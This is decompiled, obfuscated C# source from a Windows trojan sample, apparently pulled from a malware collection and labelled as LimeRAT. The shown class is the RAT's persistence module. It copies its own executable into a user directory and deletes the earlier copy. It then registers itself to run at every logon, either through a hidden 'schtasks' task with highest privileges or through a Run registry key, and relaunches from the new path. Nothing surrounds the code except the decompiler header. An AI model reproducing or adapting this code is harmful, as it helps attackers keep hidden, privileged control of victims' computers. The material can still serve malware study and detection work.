// Decompiled with JetBrains decompiler
// Type: 的澤席命希太將她的金命官.顧執是官的導澤家顧司顧商繼
// Assembly: 金是人望承子的的是公公的金司的程尊承顧, Version=1.8.7.7, Culture=neutral, PublicKeyToken=null
// MVID: E30F5A4F-F1E8-458D-9542-0A3A79B19682
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-21b86512de83574c3ad44210d025e93fb28d205cfbd18825da0a64a52063b627.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using 家執是成程尊首席受的生顧引生;
using 成官執望是導;
using 金使孫人尊導成繼的金;
using 金席行商她;

namespace 的澤席命希太將她的金命官
{
  public class 顧執是官的導澤家顧司顧商繼
  {
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void 將孫公程人顧公澤行的人她法()
    {
      if (管導行官玉.公的的顧的首太繼行的程公尊)
      {
        if (!Operators.ConditionalCompareObjectNotEqual((object) Application.ExecutablePath, 管導行官玉.是敬澤合為的法管金承接生人, false))
          return;
        try
        {
          顧執是官的導澤家顧司顧商繼.的為公是澤席合的官望席顧金引();
          顧執是官的導澤家顧司顧商繼.子的導接子人敬的孫(Conversions.ToString(管導行官玉.是敬澤合為的法管金承接生人));
          顧執是官的導澤家顧司顧商繼.澤是為的顧成顧的人澤繼合顧(的公的人官導官太命程.成顧家的的的受澤());
          if (管導行官玉.受成望子程行成顧執導尊 != null)
          {
            管導行官玉.受成望子程行成顧執導尊.Close();
            管導行官玉.受成望子程行成顧執導尊 = (Mutex) null;
          }
          為程席顧接希顧繼商生.將顧的金合為成子();
          object[] objArray;
          bool[] flagArray;
          NewLateBinding.LateCall((object) null, typeof (Process), "Start", objArray = new object[1]
          {
            管導行官玉.是敬澤合為的法管金承接生人
          }, (string[]) null, (System.Type[]) null, flagArray = new bool[1]
          {
            true
          }, true);
          if (flagArray[0])
            管導行官玉.是敬澤合為的法管金承接生人 = RuntimeHelpers.GetObjectValue(objArray[0]);
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
        管導行官玉.是敬澤合為的法管金承接生人 = (object) Application.ExecutablePath;
    }

    private static void 的為公是澤席合的官望席顧金引()
    {
      try
      {
        if (!Directory.Exists(Interaction.Environ(管導行官玉.執的澤的使的金的) + "\\" + 管導行官玉.金執成命受接承家引))
        {
          Directory.CreateDirectory(Interaction.Environ(管導行官玉.執的澤的使的金的) + "\\" + 管導行官玉.金執成命受接承家引);
        }
        else
        {
          if (!File.Exists(Conversions.ToString(管導行官玉.是敬澤合為的法管金承接生人)))
            return;
          File.Delete(Conversions.ToString(管導行官玉.是敬澤合為的法管金承接生人));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void 子的導接子人敬的孫(string 商首家商引子顧商商行引家顧)
    {
      try
      {
        using (FileStream fileStream1 = new FileStream(Application.ExecutablePath, FileMode.Open, FileAccess.Read))
        {
          byte[] array = new byte[checked ((int) (fileStream1.Length - 1L) + 1)];
          int length1 = checked ((int) fileStream1.Length);
          int offset = 0;
          while (length1 > 0)
          {
            int num = fileStream1.Read(array, offset, length1);
            if (num != 0)
            {
              checked { offset += num; }
              checked { length1 -= num; }
            }
            else
              break;
          }
          int length2 = array.Length;
          using (FileStream fileStream2 = new FileStream(商首家商引子顧商商行引家顧, FileMode.Create, FileAccess.Write))
          {
            fileStream2.Write(array, 0, length2);
            fileStream2.Flush();
            fileStream2.Close();
          }
          fileStream1.Flush();
          fileStream1.Close();
        }
        命澤成的敬太.管司程官的尊(Conversions.ToString(管導行官玉.是敬澤合為的法管金承接生人));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void 澤是為的顧成顧的人澤繼合顧(bool 太的成引席執敬顧引使顧尊尊)
    {
      try
      {
        if (太的成引席執敬顧引使顧尊尊)
          Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin /tr \"'", 管導行官玉.是敬澤合為的法管金承接生人), (object) "'\"")), AppWinStyle.Hide);
        else
          Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(管導行官玉.望程玉司希, RuntimeHelpers.GetObjectValue(管導行官玉.是敬澤合為的法管金承接生人));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
